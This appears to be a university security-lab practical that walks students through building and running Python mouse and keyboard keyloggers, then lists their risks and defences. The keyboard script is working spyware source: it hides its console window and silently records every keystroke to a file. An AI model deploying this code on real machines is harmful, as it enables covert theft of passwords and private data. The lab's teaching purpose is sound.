# Practical No. 6
## Aim: Execute Keylogger Script and Observe the Risk Associated with Keylogger

---

## What is a Keylogger?
A keylogger is a program that secretly records all keystrokes typed by a user and/or mouse movements. It is a type of surveillance/spyware. Understanding keyloggers helps in defending against them.

---

## Step 1: Create a Keylogger Folder

1. Open **File Explorer** on Windows.
2. Navigate to **D: Drive** (New Volume D:).
3. Right-click in the folder → **New** → **Folder**.
4. Name it `keylogger`.

Directory structure: `D:\keylogger\`

---

## Step 2: Install Required Libraries

Open **Command Prompt** (cmd) and install the required Python libraries:

```bash
pip install pynput
```

Expected output:
```
Collecting pynput
  Downloading pynput-1.8.1-py2.py3-none-any.whl (91 kB)
Successfully installed pynput-1.8.1
```

Also install pywin32 (for keyboard listener on Windows):
```bash
pip install pywin32
```

Expected output:
```
Collecting pywin32
  Downloading pywin32-311-cp310-cp310-win_amd64.whl (9.6 MB)
Successfully installed pywin32-311
```

---

## PART A: Mouse Keylogger

### Step 3: Write the Mouse Keylogger Code

Create a new Python file `mouse_keylogger.py` and write the following code:

```python
print("\tSecurity Assessment, Architecture and Design \n\tPractical No. 6 - Keylogger (on Mouse)")

from pynput import mouse

log_file = "D:/Keylogger/log_mouse.txt"

# Function to write mouse events to file
def write_to_file(event):
    with open(log_file, "a") as file:
        file.write(event + "\n")

# Function for mouse click events
def on_click(x, y, button, pressed):
    if pressed:
        write_to_file(f"Mouse Clicked at ({x}, {y}) with {button}")

# Function for mouse movement events
def on_move(x, y):
    write_to_file(f"Mouse Moved to ({x}, {y})")

# Function for mouse scroll events
def on_scroll(x, y, dx, dy):
    write_to_file(f"Mouse Scrolled at ({x}, {y}) with delta ({dx}, {dy})")

# Setting up listener
with mouse.Listener(on_click=on_click, on_move=on_move, on_scroll=on_scroll) as listener:
    listener.join()
```

### Run the Mouse Keylogger:
```bash
python mouse_keylogger.py
```

### Output:
- A file `log_mouse.txt` is created in `D:\keylogger\`
- The file records all mouse movements, clicks, and scrolls, for example:
```
Mouse Moved to (707, 0)
Mouse Moved to (706, 0)
Mouse Moved to (706, 1)
Mouse Clicked at (710, 5) with Button.left
Mouse Scrolled at (710, 5) with delta (0, -3)
```

---

## PART B: Keyboard Keylogger

### Step 4: Write the Keyboard Keylogger Code

Create a new Python file `keyboard_keylogger.py` and write the following code:

```python
import win32api
import win32console
import win32gui
import pythoncom
from pynput import keyboard

# Hide the console window (makes keylogger invisible to user)
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def on_press(key):
    try:
        keylogs = key.char       # For regular character keys (a, b, c, 1, 2, etc.)
    except AttributeError:
        if key == keyboard.Key.enter:
            keylogs = '\n'       # Handle Enter key
        else:
            keylogs = str(key)   # Handle special keys (Key.space, Key.ctrl, etc.)
    
    # Write the key to log file
    with open(r'D:\Keylogger\keylogger_log.txt', 'a') as f:
        f.write(keylogs)

# Set up keyboard listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the program running (pumps Windows messages)
pythoncom.PumpMessages()
```

### Run the Keyboard Keylogger:
```bash
python keyboard_keylogger.py
```

### Output:
- A file `keylogger_log.txt` is created in `D:\keylogger\`
- The console window becomes **invisible** (hidden using win32gui).
- Everything typed is recorded to the file, for example:
```
adsdsajgsngwvjhefguwe
```
(This is whatever the user typed while the keylogger was running)

---

## Step 5: View the Output Files

Navigate to `D:\keylogger\` and you will see:
- `log_mouse.txt` — 90 KB (mouse movements/clicks)
- `keylogger_log.txt` — 1 KB (keyboard keystrokes)

Open `keylogger_log.txt` to see all captured keystrokes.

---

## Risks Associated with Keyloggers

| Risk | Description |
|---|---|
| **Password theft** | Login credentials for banking, email, social media are captured |
| **Privacy breach** | All personal messages, searches, and documents are recorded |
| **Identity theft** | Personal information typed (SSN, credit card, OTP) is stolen |
| **Silent operation** | The console window is hidden — user has no idea it's running |
| **Persistent threat** | Can be set to auto-start with Windows using registry keys |
| **Data exfiltration** | Advanced keyloggers email log files to attacker automatically |

---

## Detection and Prevention

- Use **antivirus/anti-malware** software that detects keyloggers.
- Use **virtual keyboards** for entering sensitive passwords.
- Keep OS and software **updated** to patch vulnerabilities.
- Use **two-factor authentication** (even if password is stolen, attacker can't login).
- Monitor running processes using Task Manager or tools like Process Explorer.
- Use **Ctrl+Alt+Del** screen to enter Windows login password (protected from many keyloggers).

---

## Summary of Code

| Code | Purpose |
|---|---|
| `from pynput import mouse` | Import mouse monitoring library |
| `from pynput import keyboard` | Import keyboard monitoring library |
| `mouse.Listener(on_click, on_move, on_scroll)` | Listen for all mouse events |
| `keyboard.Listener(on_press)` | Listen for all key presses |
| `win32gui.ShowWindow(win, 0)` | Hide the console window |
| `open(log_file, "a")` | Open file in append mode to keep adding logs |
| `pythoncom.PumpMessages()` | Keep the program running in background |
